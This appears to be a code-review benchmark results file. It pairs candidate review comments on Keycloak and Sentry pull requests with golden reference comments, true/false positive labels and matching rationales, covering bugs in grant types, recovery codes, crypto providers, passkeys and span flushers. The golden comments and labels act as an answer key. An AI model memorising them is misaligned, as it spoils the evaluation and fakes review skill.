false_positives.candidate:
New abstract getShortcut() breaks existing custom grant type factories and can block server startup

`getShortcut()` is added to `OAuth2GrantTypeFactory` as an abstract method with no default. The OAuth2GrantType SPI exists so that custom grants can be deployed.

Custom factories compiled against the previous SPI will fail when `DefaultTokenContextEncoderProviderFactory.postInit` calls `gtf.getShortcut()` on every registered grant factory. They will throw `AbstractMethodError` during server startup, preventing Keycloak from booting.

A custom factory that returns `null` causes a `NullPointerException` from `ConcurrentHashMap.put` in the same `postInit`.

Provide a default implementation (or a fallback when the shortcut is missing or invalid). Encoding should degrade to the unknown grant (`na`) instead of failing startup or token issuance.

Client credentials (and other flows) never set the GRANT_TYPE attribute, so their tokens encode grant as 'na'

The grant type is only put into the `ClientSessionContext` in these places:
- `OAuth2GrantTypeBase.createTokenResponse`
- ROPC
- refresh
- PreAuthorizedCode
- `StandardTokenExchangeProvider`

`ClientCredentialsGrantType` builds its response with `tokenManager.responseBuilder(...).generateAccessToken()` directly and does not call `createTokenResponse`. Its access tokens are therefore encoded as `...na:<uuid>` rather than `...cc:<uuid>`, even though the `cc` shortcut is registered here. The unit test's `trltcc` example implies `cc` is expected.

The same applies to UMA/permission grant tokens (`pg`) and the legacy V1 token-exchange providers. This undermines the stated purpose of letting endpoints rely on the encoded grant type.

Set `Constants.GRANT_TYPE` in these code paths too.

Public Context copy constructor removed from SPI class

`public Context(Context context)` was deleted from `OAuth2GrantType.Context`. This change is unrelated to the feature. Any extension that wraps or copies the grant context (e.g. custom grant types delegating to another grant) will no longer compile or link.

If removal is intended, it should be called out as a breaking change. Otherwise keep the constructor and copy the new `grantType` field in it.

grantType derived once in constructor and not updated by setFormParams

`grantType` is computed from `formParams` only in the constructor. `setFormParams(...)` replaces `formParams` but leaves `grantType` unchanged.

Any caller that swaps the form parameters gets a `getGrantType()` value that no longer matches them. That stale value is what `OAuth2GrantTypeBase.createTokenResponse` and ROPC write into the client session context and encode into the token ID.

Either update `grantType` in `setFormParams` or derive it lazily from the current `formParams`.

Lazy refresh can silently overwrite an existing shortcut mapping

The duplicate-shortcut validation runs only in `postInit`. When a grant type is hot-deployed later, `getShortcutByGrantType` (and `getGrantTypeByShortcut`) does `grantsByShortcuts.put(shortcut, grantType)` without checking whether that shortcut already belongs to another grant.

A colliding shortcut replaces the existing mapping. Tokens previously issued for the original grant would then decode to the wrong grant type.

Use `putIfAbsent` and reject or log the conflict, applying the same uniqueness check as in `postInit`.

The credential is read back only via `CredentialInputUpdater.getCredentials`. That is a default method returning an empty stream, and the classic credential SPI does not require providers to override it. For such a provider, `RecoveryAuthnCodesUtils.getCredential(user)` returns an empty Optional.

`credentialModelOpt.get()` then throws `NoSuchElementException` while rendering the recovery-code login page, so the user cannot log in with recovery codes. Separately, the authenticator sees `recoveryCodeCredentialModel == null` and adds CONFIGURE_RECOVERY_AUTHN_CODES after every successful recovery-code login.

false_positives.candidate:
Old local recovery codes stay valid after regenerating into user storage

Before this change, regenerating recovery codes went through `RecoveryAuthnCodesCredentialProvider.createCredential`, which deletes any existing recovery-codes credential before storing the new one. Regeneration therefore revoked the old codes.

Now, when `user.credentialManager().updateCredential(...)` returns true because the user storage accepted the codes, the local path is skipped. Any recovery-codes credential already stored locally for that user is left in place. This happens for users who set up codes before their provider supported the type, or while it was disabled.

`UserCredentialManager.isValid` falls back to local `CredentialInputValidator` providers when the user storage rejects an input. So the stale local codes are still accepted at login. A user who regenerates codes because the old ones leaked would still be able to log in with the leaked codes.

Fix: remove any locally stored `RecoveryAuthnCodesCredentialModel.TYPE` credentials when the user storage takes ownership.

Exhausted federated recovery codes are never removed

`RecoveryAuthnCodesUtils.getCredential` can now return a credential that lives in the user storage provider. When that credential reports `allCodesUsed()`, the code calls `removeStoredCredentialById(id)`. That method only deletes from Keycloak's own DB (local or federated-storage tables), so it cannot remove the credential held by the user storage provider.

The call is a silent no-op, or it fails if the provider-built model has a null id. For example, `createFromValues` does not set an id, and `em.find(..., null)` throws `IllegalArgumentException`.

The exhausted credential then stays in the user storage, and `isConfiguredFor` keeps returning true. If the user does not finish the CONFIGURE_RECOVERY_AUTHN_CODES required action, the next login shows the recovery-code form again. `RecoveryAuthnCodeInputLoginBean` then calls `getNextRecoveryAuthnCode().get()` on an empty Optional and the page errors out.

Fix: use `disableCredentialType` or similar for federated credentials, and guard against a null id.

Undocumented, asymmetric storage format for federated recovery codes

The read and write sides of the new user-storage contract use different formats, and neither is documented.

Write side: the user storage receives a `UserCredentialModel` whose challenge response is a JSON array of plaintext codes. The user label and generatedAt timestamp are dropped.

Read side: `RecoveryAuthnCodesUtils.getCredential` feeds whatever `getCredentials` returns into `RecoveryAuthnCodesCredentialModel.createFromCredentialModel`. That method requires Keycloak's internal credentialData/secretData layout with hashed codes and used flags, and throws a `RuntimeException` on parse failure.

A provider that returns the credential it was given, as the test provider does for OTP, breaks the authenticator and login form. The test provider only works because it manually rebuilds the internal model via `createFromValues`. This contract should be documented, or the read side should tolerate the format that was written.

Test storage never consumes codes, leaving federated single-use and exhaustion paths untested

The test provider's `isValid` accepts any code in the stored list, whichever code number the form asked for. It also never marks codes as used, and `getCredentials` rebuilds a fresh model every time, so the next code is always #0.

As a result, `testRecoveryKeysSetupAndLogin` only checks one happy-path login. It would still pass if the wrong code were accepted or codes could be reused.

The new federated-specific paths in `RecoveryAuthnCodesFormAuthenticator` have no coverage:
- the all-codes-used removal
- required-action re-adding
- fallback when the provider exposes no credential
- regenerating when local codes already exist

New feature added without updating the approved help-output snapshots

Adding `ROLLING_UPDATES` changes the list of possible values printed by `--features` and `--features-disabled` in every command's help. The Quarkus `HelpCommandDistTest` compares that output against static `*.approved.txt` snapshot files, and none of them are updated in this PR. Adding `rolling-updates:v1` to the feature list should make those approval tests fail. Regenerate and commit the approved help files, along with any other test that hard-codes the preview feature list.

Docs say the Operator fails without `rolling-updates`, but nothing enforces it

The new CAUTION says the `rolling-updates` feature must be enabled or the Operator will fail. This PR adds no Operator validation that inspects the CR's enabled features. The `ROLLING_UPDATES` enum constant is new here, so no earlier check could reference it. The Operator also does not run the `update-compatibility` commands in this version; the only update strategy is Recreate (or unset). So setting `spec.update.strategy: Recreate` without the feature still works, and the documented failure never happens. `UpgradeTest` enables the feature only when a strategy is set and never covers the claimed failure. Either add a reconcile-time validation that reports an error status when `spec.update` is used without the feature, or correct the documentation.

Appending `--features=rolling-updates` to every documented command overrides the user's feature configuration

The `updatecompatibility` macro now hard-codes `--features=rolling-updates` on every documented invocation. A CLI option takes precedence over keycloak.conf and env, so any features the user already enables (e.g. `features=token-exchange` in the config file) are replaced for that run. That contradicts the guide's warning that the command must be run with exactly the same configuration as the deployment. A user who also passes their own `--features` gets a duplicate option.

`features` is also a build-time option. With an optimized/pre-built image (`--optimized`, which these commands support via `OptimizedMixin`), a runtime `--features` value is not applied. The check then reads the build-time profile and exits with "feature disabled" unless the image was built with the feature, as the PR itself does in `Dockerfile-custom-image`.

The docs should tell users to add `rolling-updates` to their existing feature list and to include it at build time for optimized images.

Feature-gate and new exit codes are not asserted

`testFeatureNotEnabled` only exercises the `metadata` subcommand and only checks the error text. It never asserts the documented exit code 4 (`CompatibilityResult.FEATURE_DISABLED`), and the `check` subcommand's gate is not tested at all. The PR also changes `RECREATE_UPGRADE_EXIT_CODE` from 4 to 3 and gives 4 a new meaning, yet `testWrongVersions` never asserts the exit code. A regression mixing up these two values, which callers rely on to choose a rolling vs. recreate strategy, would go unnoticed. Add `assertEquals(...exitCode())` checks for the disabled-feature case on both subcommands and for the incompatible-version case.

canView(client) short-circuits on all-clients VIEW, so per-client deny permissions cannot restrict view

So if an admin is granted VIEW on all clients, a per-client NEGATIVE VIEW permission for a specific client is never consulted. The admin can still view that client.

This contradicts the resource-specific-overrides-type semantics used elsewhere in V2. For users, `testViewUserPermission` shows a per-user deny overriding the all-users allow. Here an administrator cannot hide individual clients from someone holding all-clients VIEW.

`canView(client)` should only short-circuit on the admin roles (`canViewClientDefault`). The VIEW decision should go through `hasPermission(client, VIEW)`, which already falls back to the all-clients resource.

getResourceName not updated for the Clients resource type

`getResourceName` maps only `Users` resources: "All users" for the type resource, or the username for a user. For policies of type `Clients` it falls through to `resource.getDisplayName()`.

Neither the per-client resources (created with only a name) nor the "Clients" type resource have a display name. Permission representations for client permissions will therefore show null resource names instead of the clientId or an "All clients" label.

Add a `CLIENTS` branch that resolves the client by id and returns its clientId.

Javadoc for void require* methods says they "Return true"

Both methods are `void` and throw ForbiddenException when the check fails. The other `require*` methods in this interface are documented that way. These two docs are wrong.

Each `hasPermission(client, scope)` call:
- performs a full policy evaluation over all scopes of the resource, then discards everything but one scope;
- on the fallback path, also runs a `findByResource` query.

`canView(client)` chains `canView()`, then `canConfigure` → `canManage` → `hasPermission(MANAGE)`, then `hasPermission(CONFIGURE)`, then `hasPermission(VIEW)`. That is up to four evaluations of essentially the same resource. `getAccess(client)` repeats this for view, manage and configure.

When listing clients without the view-clients role, this runs for every client in the realm. Evaluate once and check the granted scopes set, or cache per request.

New client scopes and override semantics are not actually verified

- No test covers `MAP_ROLES_CLIENT_SCOPE`.
- No test covers `getClientsWithPermission`.
- No test covers a per-client NEGATIVE permission combined with an all-clients permission, as is done for users.

These tests would have exposed the canView short-circuit and the getClientsWithPermission bug.

Some tests change realm state and never restore it:
- `testMapRolesAndCompositesOnlyOneClient` creates client roles `myclient-role` and `myclient-subRole`, maps one to `myadmin`, and adds a composite. It registers no `realm.cleanup()` actions.
- `testManageOnlyOneClient` renames `myclient` and moves a default client scope to optional without reverting.

Other tests in the class index into `getDefaultClientScopes()` and depend on `myclient`'s state. These changes make results order-dependent, and a role-create conflict will occur if the realm is reused.

true_positives.golden_comment: Returns wrong provider (default keystore instead of BouncyCastle)
true_positives.matched_candidate:
Multiple-provider guard removed; equal-order providers are now picked silently by classpath order

`detectProvider` used to throw `IllegalStateException` when more than one `CryptoProvider` was found. That check protected against a misconfigured classpath, for example one containing both `keycloak-crypto-default` and `keycloak-crypto-fips1402`.

Now the list is sorted by `order()` and the first entry is used. `DefaultCryptoProvider`, `WildFlyElytronProvider` and `FIPS1402Provider` all return 200, and the sort is stable, so a tie between them is broken by ServiceLoader/classpath order. The other providers are reported only at DEBUG level.

Consequences:
- A FIPS deployment that accidentally has the default provider on the classpath can silently run with the non-FIPS BouncyCastle provider instead of failing fast.
- `ServiceLoader` instantiates every provider before sorting. The ignored providers' constructors still run their global side effects: FIPS inserts BCFIPS/BCJSSE at JVM security-provider positions 1-3 and rewrites `ssl.*ManagerFactory.algorithm`, and Default registers BC. The JVM can end up in a mixed state.

Suggested fix: keep failing (or at least log at WARN) when two or more providers share the highest order. Only allow silent fallback when the winner has a strictly higher order, such as 200 vs the authz-client's 100.
true_positives.reasoning: Both comments concern detectProvider selecting the wrong crypto provider due to ordering/classpath tie-breaking instead of the intended BouncyCastle/FIPS provider. The candidate describes the same provider-selection bug with more detail.

true_positives.matched_candidate:
New abstract interface method breaks existing CryptoProvider implementations

`int order();` is added to the public `CryptoProvider` interface in keycloak-common without a default implementation. Any `CryptoProvider` implemented outside this repository stops compiling, or fails at runtime with `AbstractMethodError` when `CryptoIntegration` calls `order()` while sorting. This includes custom providers and implementations in keycloak-client or other downstream projects built against a newer keycloak-common.

A `default int order() { return 0; }` (or similar) would keep compatibility and still let the bundled providers override it.
true_positives.reasoning: Both comments identify the same compatibility break: adding abstract order() to CryptoProvider without a default implementation can break existing external implementations, with the candidate explicitly recommending a default method.

false_positives.candidate:
ES384/ES512 tests use a P-256 key, so real curve sizes and long-form DER lengths are never tested

The key pair comes from `KeyPairGenerator.getInstance("EC").genKeyPair()`, which defaults to P-256. The same 32-byte r/s values are reused for ES384 and ES512; they are only zero-padded to 48/66 bytes.

As a result:
- P-384 and P-521 signatures are never exercised.
- A P-521 DER signature is about 139 bytes. That is the only case that triggers the long-form length (>127) path in `ASN1Encoder.writeLength` and `ASN1Decoder.readLength`, and it stays untested.

The test also only checks that the custom encoder and decoder agree with each other. It never compares `concatenatedRSToASN1DER` output with the JDK-produced DER (`sign`), and never checks that the result passes `Signature.verify`. Symmetric bugs in the hand-written ASN.1 code would therefore go unnoticed.

Suggested fix: initialize the generator with `secp256r1`/`secp384r1`/`secp521r1` per algorithm, and assert `Arrays.equals(asn1Des, sign)` or verify the re-encoded signature.

false_negatives.golden_comment: When length starts at -1 from indefinite-length encoding, the arithmetic 'length = length - bytes.length' will behave unexpectedly, potentially leading to incorrect processing of encoded data.

true_positives.golden_comment: Returning null from getSubGroupsCount() violates the GroupModel contract (Javadoc says it never returns null) and may lead to NPEs in callers that expect a non-null count.
true_positives.matched_candidate:
getSubGroupsCount now returns null, unlike other GroupModel implementations

Other `GroupModel` implementations return an actual count and never null: the default method counts the subgroup stream, and JPA runs a count query. The cached adapter now returns `null` when the backing group has disappeared. Any caller that unboxes or compares the `Long` (e.g. `getSubGroupsCount() > 0`) would trade the original NPE for a new one.

Returning `0L` for a deleted group would keep the contract consistent. Alternatively, document that null means "group no longer exists".
true_positives.reasoning: Both comments identify the same bug: getSubGroupsCount() returning null breaks the GroupModel non-null contract and can cause NPEs in callers that unbox or compare the count. The candidate adds implementation context and a suggested fix, but the underlying issue is the same.

true_positives.golden_comment: The reader thread isn’t waited for; flipping deletedAll to true and asserting immediately can race and miss exceptions added just after the flag change, making this test flaky.
true_positives.matched_candidate:
Reader thread is never joined, so exceptions can be missed and the thread leaks

After the deletes, the test sets `deletedAll` to true and immediately asserts that `caughtExceptions` is empty. It never waits for the reader thread to finish.

The reader may still be inside a `groups()` request at that moment. That last request is the one most likely to hit the race, and any exception from it is added after the assertion has already passed, so the regression can go undetected.

The thread is also non-daemon and unmanaged. It can keep sending requests to the shared managed realm while cleanup or the next test runs, which causes cross-test interference.

Keep a reference to the thread and `join()` it (with a timeout) before asserting.
true_positives.reasoning: Both comments identify the same core bug: the test flips deletedAll and asserts without waiting for the reader thread, so a late exception can be missed and the test becomes flaky. The candidate adds thread-leak concerns, but it points to the same underlying issue.

false_positives.candidate:
Same concurrent-delete NPE remains in the paginated getSubGroupsStream overloads

The PR null-guards `modelSupplier.get()` only in `getSubGroupsCount()`. Three sibling methods still call `modelSupplier.get().getSubGroupsStream(...)` with no null check:
- `getSubGroupsStream(search, firstResult, maxResults)` (line 256)
- `getSubGroupsStream(firstResult, maxResults)` (line 262)
- `getSubGroupsStream(search, exact, firstResult, maxResults)` (line 268)

`getGroupById` on the delegate returns null once the group is deleted in the database while the cached adapter is still in use. In that window these methods throw the same NullPointerException the PR is meant to fix. A realistic trigger is listing a group's children (the admin console's children endpoint) while another request deletes the group. The fix is incomplete; these methods should get the same null handling, e.g. return `Stream.empty()`.

Test does not ensure reads actually overlap with deletes

The reader thread is started and the main thread begins deleting right away. Nothing guarantees the reader has started, or completed any request, before or during the deletions. On a fast or loaded machine the deletes can finish before any concurrent read happens, and the test passes without exercising the fix.

A latch or counter would fix this, for example:
- wait for the first successful read before starting deletes, and/or
- assert that at least N reads happened while deletes were in progress.

Without it, the regression test is nondeterministic and can pass vacuously.

Hierarchy population still NPEs if a parent group is deleted concurrently

`populateGroupHierarchyFromSubGroups` looks up each parent with `session.groups().getGroupById(realm, currGroup.getParentId())` and uses the result without a null check. The result is passed to `groupEvaluator.canView(parentModel)`, `toRepresentation(groupEvaluator, parentModel, full)` and `populateSubGroupCount(parentModel, parent)`.

This code path runs when groups are searched. If a parent is deleted between loading the child and walking up the tree, the lookup returns null and the request fails with a NullPointerException. This is the same class of bug the PR addresses, and this file is touched by the PR, but the path is left unguarded. The new test only covers the non-search listing, so it does not catch it.

true_positives.golden_comment: In UsernameForm.authenticate(), isConditionalPasskeysEnabled() is called without passing the required UserModel parameter.
true_positives.matched_candidate:
Call to non-existent no-arg isConditionalPasskeysEnabled() breaks compilation

`UsernameForm.authenticate` calls `isConditionalPasskeysEnabled()` with no arguments. The only declaration, in `UsernamePasswordForm` (line 160), takes a `UserModel` parameter, and no no-arg overload exists in the class hierarchy. The `services` module will not compile. The call should pass the user, e.g. `isConditionalPasskeysEnabled(context.getUser())`.
true_positives.reasoning: Both identify the same bug in UsernameForm.authenticate(): isConditionalPasskeysEnabled() is invoked without the required UserModel argument, and the candidate correctly notes the method signature and suggested fix.

true_positives.golden_comment: With isConditionalPasskeysEnabled(UserModel user) requiring user != null, authenticate(...) will not call webauthnAuth.fillContextForm(context) on the initial login page where context.getUser() is still null, so conditional passkey UI will not be set up for first-time passkey login. Consider whether this should also be enabled when no user has been selected yet so ID-less passkey authentication on the initial login form continues to work.
true_positives.matched_candidate:
`user != null` turns off conditional passkeys for normal (unidentified) login

`isConditionalPasskeysEnabled` returns `webauthnAuth != null && webauthnAuth.isPasskeysEnabled() && user != null`. Before this change, webauthn data was filled exactly when no user was selected (`context.getUser() == null`). The new check does the opposite: on a first login there is no context user, so `authenticate()` (line 115) never calls `webauthnAuth.fillContextForm`. Passkey conditional UI and the discoverable-key auto login therefore no longer appear on the initial login page.

The error path is affected too. `getUser()` calls `context.clearUser()`, and `validateUser` only sets the user after the password is validated. So `challenge(context, error, field)` (line 137) also sees a null user after an invalid username or invalid password, and passkeys vanish from the error page.

This breaks the main passkeys feature; existing tests such as `webauthnLoginWithDiscoverableKey` should fail. The check should allow `user == null` (for example `user == null || <user has passkey credential>`) rather than require a non-null user.
true_positives.reasoning: The candidate identifies the same bug: the new user != null requirement prevents webauthnAuth.fillContextForm from running on the initial login page where no user is selected, breaking conditional/discoverable passkey login. Extra error-path detail does not change the core issue.

false_positives.candidate:
Re-authentication enables passkeys for any identified user, even one with no passkey credential

For an already-identified user, the new condition depends only on the realm setting. It never checks whether that user has a passwordless/passkey credential (e.g. `user.credentialManager().isConfiguredFor(webauthnAuth.getCredentialType())`). Two problems follow:

1. During re-authentication (e.g. `prompt=login`), users without passkeys are shown the passkey UI and a browser WebAuthn prompt they cannot complete.
2. In `UsernameForm.authenticate`, the shortcut that skips the username step for an already-identified user is disabled whenever the realm has passkeys enabled. Every re-authenticating user, including those without passkeys, gets an extra username form with the username hidden and nothing to fill in.

The condition should also require that the current user actually has a passkey credential.

"User without passkey" test actually disables passkeys for the whole realm

`reauthenticationOfUserWithoutPasskey` and its comment claim to check that passkeys are not shown during re-authentication "as this user does not have passkey". The test, however, sets `setWebAuthnPolicyPasskeysEnabled(Boolean.FALSE)`, which turns the feature off realm-wide.

The case that matters is not covered: a realm with passkeys enabled and a user who has no passkey credential re-authenticating. That is exactly where the new `isConditionalPasskeysEnabled` logic misbehaves, showing the passkey UI and no longer skipping `UsernameForm`. The test should keep passkeys enabled and log in as a user without a WebAuthn credential.

true_positives.golden_comment: In the SpanFlusher flush loop, metric tags inconsistently use 'shard' (e.g., in spans.buffer.flusher.produce and spans.buffer.segment_size_bytes) and 'shards' (in spans.buffer.flusher.wait_produce) for the same shard identifier value. This prevents correct metric aggregation across flush stages — dashboards and alerts filtering by tag 'shard' will miss data tagged as 'shards' and vice versa.
true_positives.matched_candidate:
Inconsistent metric tag key: 'shard' vs 'shards'

`spans.buffer.flusher.produce` and `spans.buffer.segment_size_bytes` are tagged with `shard`, but `spans.buffer.flusher.wait_produce` is tagged with `shards`. The value is the same comma-joined shard list. Dashboards and queries that slice by shard will not work uniformly across these related flusher metrics. Use the same tag key for all of them.
true_positives.reasoning: The candidate identifies the same inconsistency: 'shard' versus 'shards' tags on the same shard identifier across the named flusher metrics, causing aggregation and dashboard filtering problems. The wording and metric names align directly with the golden comment.

true_positives.golden_comment: The test_basic function in test_consumer.py uses a monkeypatched time.sleep that returns immediately, but then calls time.sleep(0.1) expecting it to actually wait.
true_positives.matched_candidate:
Added time.sleep(0.1) is a no-op because time.sleep is monkeypatched

The test does `monkeypatch.setattr("time.sleep", lambda _: None)` at the top. The new `time.sleep(0.1)`, meant to "give flusher threads time to process after drift change", resolves through the patched `time` module attribute and does nothing.

The race the comment describes is still present. `join()` sets `stopped` immediately, and the flusher thread can exit its loop before it flushes with the new drift. `(msg,) = messages` can then fail intermittently.

Use a real sleep captured before patching (e.g. `from time import sleep` as test_flusher.py does), or better, poll until `messages` is non-empty with a timeout.
true_positives.reasoning: Both identify the same bug: time.sleep is monkeypatched to return immediately, so the subsequent time.sleep(0.1) call is a no-op and does not actually wait, leaving the race condition unaddressed.

true_positives.golden_comment: Because flusher processes are created via multiprocessing.get_context('spawn').Process, they are instances of multiprocessing.context.SpawnProcess, which on POSIX is not a subclass of multiprocessing.Process, so this isinstance check will always be false and hung processes won't be killed here.
true_positives.matched_candidate:
Hung flusher process is never killed because the isinstance check never matches spawn processes

Processes are created with `multiprocessing.get_context("spawn").Process`, which is `multiprocessing.context.SpawnProcess`. `multiprocessing.Process` is `multiprocessing.context.Process`, and `SpawnProcess` is not a subclass of it (both derive from `BaseProcess`). So `isinstance(process, multiprocessing.Process)` is always False and `process.kill()` is never called.

The old code called `kill()` unconditionally, so this is a regression. When a process is restarted for the `hang` cause, the hung process keeps running while a replacement is spawned for the same shards. It also shares the same `healthy_since` and `backpressure_since` Values.

If the old process resumes, two flushers work on the same Redis shards concurrently, which can produce duplicate segments to `buffered-segments`. Each further hang leaks another process, up to MAX_PROCESS_RESTARTS.

Use `isinstance(process, multiprocessing.process.BaseProcess)`, or check `not isinstance(process, threading.Thread)`.
true_positives.reasoning: The candidate identifies the same bug: spawn-created flusher processes are SpawnProcess instances, not subclasses of multiprocessing.Process, so the isinstance check is always false and hung processes are never killed.

true_positives.golden_comment: Sleep in test_consumer.py won’t actually wait because time.sleep was monkeypatched above; consider restoring sleep or using a different sync to ensure the flusher has time to process.
true_positives.matched_candidate:
Added time.sleep(0.1) is a no-op because time.sleep is monkeypatched

The test does `monkeypatch.setattr("time.sleep", lambda _: None)` at the top. The new `time.sleep(0.1)`, meant to "give flusher threads time to process after drift change", resolves through the patched `time` module attribute and does nothing.

The race the comment describes is still present. `join()` sets `stopped` immediately, and the flusher thread can exit its loop before it flushes with the new drift. `(msg,) = messages` can then fail intermittently.

Use a real sleep captured before patching (e.g. `from time import sleep` as test_flusher.py does), or better, poll until `messages` is non-empty with a timeout.
true_positives.reasoning: Both identify the same test bug: the added time.sleep(0.1) does not actually wait because time.sleep was monkeypatched, leaving the flusher race intact. The candidate also proposes the same class of fix (real sleep or polling).

true_positives.golden_comment: Breaking out of the loop when the deadline has elapsed can skip terminating remaining flusher processes, potentially leaving them running after shutdown; consider ensuring termination is attempted even if the deadline is exceeded.
true_positives.matched_candidate:
join() breaks out of loop on deadline, skipping cleanup of remaining processes

When the deadline has passed, the loop does `break`. Every remaining process in `self.processes` is then neither waited on nor terminated.

The previous single-process code always reached the terminate step after the wait. Now, if the first process consumes the timeout, processes 2..N are silently left running. The remaining processes should still be terminated when the deadline is exceeded: skip the wait but not the terminate.
true_positives.reasoning: Both comments describe the same bug: breaking out of the loop after the deadline skips termination of remaining flusher processes, leaving them running. The candidate correctly recommends still terminating them even if waiting is skipped.

false_positives.candidate:
join() never terminates spawn processes (same isinstance mismatch)

In `join()`, `isinstance(process, multiprocessing.Process)` is False for `SpawnProcess` objects, so `process.terminate()` is never called. Flusher processes that do not exit before the deadline keep running after the strategy is joined.

On rebalance the consumer process stays alive and builds a new SpanFlusher. Old flusher processes can then keep flushing alongside new ones for the same shards. With N processes per flusher, the number of leaked processes now scales with shard count. Check against `multiprocessing.process.BaseProcess` instead.

Redis memory info and stored-segment queries are now repeated per flusher process on the consumer main thread

`submit()` now loops over `self.buffers` and calls `get_memory_info()` and `record_stored_segments()` on each per-process SpansBuffer. `get_memory_info()` reports memory for the whole Redis cluster, not per shard. With N flusher processes, every submit therefore issues N times the INFO round-trips to every Redis node.

The ratio is unaffected because `used` and `available` are both multiplied by N, so the work is purely redundant. `record_stored_segments()` likewise goes from one pipeline to N.

This cost lands on the consumer main thread, which the PR is trying to keep minimal. Query memory once, for example via the original full-shard buffer, and batch the ZCARDs in a single pipeline.

Docstring claims one process per shard, but processes are capped and the CLI default is 1

The class docstring says "Creates one process per shard for parallel processing." The implementation actually creates `min(max_processes, len(shards))` processes and round-robins shards across them. The `--flusher-processes` CLI option defaults to 1, so production behaviour by default is still a single flusher process handling all shards. Update the docstring to describe the capped, shared-process behaviour.

true_positives.golden_comment: Using zip(error_ids, events.values()) assumes the get_multi result preserves the input order; dict value order is not guaranteed to match error_ids, so event data can be paired with the wrong ID (missing nodes also shift alignment).
true_positives.matched_candidate:
zip(error_ids, events.values()) assumes nodestore get_multi preserves input order

`nodestore.backend.get_multi` returns a dict. The base implementation fills it with cache hits first and then adds backend-fetched items, so the value order does not follow `node_ids`. Backends may also omit missing keys.

Zipping `error_ids` against `events.values()` can therefore attach the wrong event ID to an event's data, and can drop or shift entries when some IDs are missing.

Iterate over `zip(error_ids, node_ids)` and look up `events.get(node_id)` instead.
true_positives.reasoning: The candidate describes the same bug: zipping error_ids with events.values() relies on get_multi preserving input order, but dict values may be ordered differently and missing keys can shift or drop entries, pairing event data with the wrong ID.

true_positives.golden_comment: Hardcoded empty data passed to TableWidgetVisualization causes it to always render an empty table instead of displaying actual results when the feature flag is enabled.
true_positives.matched_candidate:
Feature-flagged TableWidgetVisualization ignores the actual table results

When `use-table-widget-visualization` is enabled, the widget renders `<TableWidgetVisualization columns={[]} tableData={{data: [], meta: {fields: {}, units: {}}}} />`. It ignores `result.data`, `result.meta`, the loading state, field aliases and custom renderers.

Any org with the flag on sees an empty table for every table widget. Wire `result` into `tableData` and derive `columns` from `fields`, or keep the flag off until that is done.
true_positives.reasoning: Both identify the same bug: the feature-flagged TableWidgetVisualization is passed hardcoded empty data, causing it to ignore actual results and render an empty table.

true_positives.golden_comment: Validation logic incorrectly uses .get('timestamp'), which treats a timestamp of 0 as absent. It should directly check 'timestamp' in self.initial_data to ensure proper field presence detection, preventing both 'age=0' and 'timestamp' from passing mutual-exclusion validation.
true_positives.matched_candidate:
Mutual-exclusion checks for age/timestamp use truthiness

`validate_timestamp` uses `self.initial_data.get("age")` and `validate_age` uses `self.initial_data.get("timestamp")`. A value of 0 is falsy, and `age: 0` is common for freshly generated reports. A report carrying both `age: 0` and a `timestamp` therefore passes validation, contrary to the stated intent.

Neither field is required either, so a report with neither one is accepted, even though the docstrings say one must be present.

Use `"age" in self.initial_data` / `"timestamp" in self.initial_data`, and add an object-level `validate()` that enforces exactly one of the two.
true_positives.reasoning: The candidate identifies the same bug: truthiness checks via .get() treat age/timestamp value 0 as absent, allowing both fields to pass mutual-exclusion validation. The extra suggestion about requiring exactly one field does not change the core issue.

true_positives.golden_comment: Analytics events are recorded before the feature flag check, resulting in analytics being logged for all requests, including those that return 404 due to the feature being disabled. This can lead to misleading analytics data.
true_positives.matched_candidate:
Assemble analytics event recorded before feature/validation checks

`analytics.record("preprod_artifact.api.assemble", ...)` runs before the `organizations:preprod-artifact-assemble` feature check and before body validation.

Every request is counted as an assemble event, including requests from orgs without the feature that get a 404 and requests with invalid bodies that get a 400. Polling requests are counted too. This inflates the metric.

Move the call after the feature check, and ideally after successful validation.
true_positives.reasoning: Both identify the same bug: the assemble analytics event is recorded before the feature flag check, so disabled-feature requests (404) and other rejected requests are counted, inflating analytics. The candidate adds validation/polling detail but points to the same underlying issue and fix.

false_positives.candidate:
Error timestamps (seconds) compared against rrweb event timestamps (milliseconds)

`gen_request_data` merges errors into the breadcrumb stream by comparing `error_events[i]["timestamp"] < event.get("timestamp", 0)`. The error timestamp comes from nodestore event data, which is float seconds (~1.7e9). The top-level `timestamp` on recorded replay events is in milliseconds (~1.7e12); the SDK writes breadcrumb custom events with `timestamp = breadcrumb.timestamp * 1000`.

Because of the unit mismatch, every error compares as "before" the first recording event. All error messages are emitted at the start of the log list instead of in chronological order. The log lines also carry inconsistent time units, which degrades the Seer summary.

The new tests mask this by using second-based timestamps for the recording events. Normalize both sides to the same unit before comparing, e.g. multiply the error timestamp by 1000.

All replay errors are injected into every paginated page

`analyze_recording_segments` is bound with the full `error_events` list and is called once per page of segments by `GenericOffsetPaginator`. `gen_request_data` yields any errors not consumed by the page's events at the end.

For replays spanning more than one page, every page's Seer request contains the complete set of errors, including errors outside that page's time range. Those errors are duplicated across pages and misattributed in the summaries.

Filter `error_events` to each page's time window, or fetch all segments in one request.

Snuba replay query runs even when error context is disabled

`query_replay_instance` and `process_raw_response` run unconditionally before the `enable_error_context` check. When the caller passes `enable_error_context=false`, the endpoint still pays for a Snuba round-trip whose result is discarded.

When error context is enabled, nodestore payloads for every error ID on the replay are fetched up front on each request.

Move the Snuba query inside the enabled branch.

HIDDEN_ATTRIBUTES only filtered while a search query is active

The `HIDDEN_ATTRIBUTES` filter is applied only in the branch after `if (!searchQuery.trim()) { return sorted; }`.

With an empty search box, the default view, `is_segment`, `project_id` and `received` are still shown. They disappear only once the user types a query.

Apply the hidden-attribute filter before the early return.

One invalid report causes the whole batch to be rejected with 422

Browsers send reports in batches, and the Reporting API retries non-2xx deliveries. Returning 422 as soon as any single report fails validation drops all the valid reports in the same request.

The browser will then retry the entire batch, including the bad report that will never validate. That produces repeated failed deliveries and lost data for the valid reports.

Consider skipping or recording invalid reports individually and still returning 2xx.

Per-issue recommended-event lookup when building PR comments

`get_environment_info` calls `issue.get_recommended_event()` for every issue in the comment. That method does a Snuba query plus a nodestore fetch, and `get_environment()` adds a DB lookup.

This runs serially inside the PR comment task for every issue listed, adding several round-trips per issue. Any failure is swallowed by a broad `except Exception`.

Consider batching the lookups or using a cheaper source of environment information, such as the group's tag values.

Null max_segment_id case isn't actually exercised

The test now passes a row with `max_segment_id: None`, but `delete_matched_rows` is mocked. The new `None` guard in `_make_recording_filenames` is never executed.

If the guard were removed, this test would still pass. Add a direct unit test of `_make_recording_filenames` / `delete_replay_recordings` with `max_segment_id=None`.

